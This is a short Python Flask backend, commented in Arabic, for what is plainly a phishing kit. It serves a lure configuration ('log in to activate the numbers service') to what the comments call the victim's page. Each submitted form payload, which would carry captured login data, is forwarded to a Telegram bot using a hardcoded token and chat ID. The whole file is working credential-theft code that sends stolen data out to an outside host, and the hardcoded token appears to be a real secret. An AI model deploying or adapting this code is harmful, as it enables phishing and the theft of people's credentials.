from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# 1. ضع التوكن الحقيقي هنا (الأرقام والرموز فقط)
TOKEN = "8713127522:AAGfj4acg204MMc0SX7keJNtP4fWN9L-lYQ"
# 2. ضع الأيدي الخاص بك هنا
CHAT_ID = "7984067238"

# تخزين الإعدادات لتعرضها صفحة الضحية
latest_config = {
    "image": "https://telegra.ph/file/1792945d7d91986420551.jpg",
    "letter": "سجل دخولك لتفعيل خدمة الأرقام",
    "button": "تفعيل الآن"
}

@app.route('/api/save', methods=['POST'])
def save_data():
    global latest_config
    try:
        data = request.json
        # إذا كانت البيانات لتحديث اللوحة
        if 'image' in data and 'letter' in data and 'button' in data:
            latest_config = data
        
        # إرسال البيانات للبوت
        msg = f"🚀 **بيانات جديدة:**\n\n{data}"
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/get', methods=['GET'])
def get_config():
    return jsonify(latest_config)

def handler(environ, start_response):
    return app(environ, start_response)
